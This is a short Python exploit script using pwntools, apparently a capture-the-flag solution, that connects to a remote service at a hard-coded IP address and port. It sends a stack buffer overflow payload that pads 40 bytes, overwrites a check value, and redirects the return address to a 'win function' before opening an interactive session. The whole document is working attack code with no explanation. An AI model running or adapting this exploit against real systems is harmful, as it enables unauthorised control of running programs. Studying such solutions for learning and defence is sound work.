from pwn import *
p=process("./medium")
p=remote("103.47.224.217",7002)
pay=b"A"*40 #padding
pay+=p64(0x9876543212345678)
pay+=b"A"*8
pay+=p64(0x401177) #win function
p.sendline(pay)
p.interactive()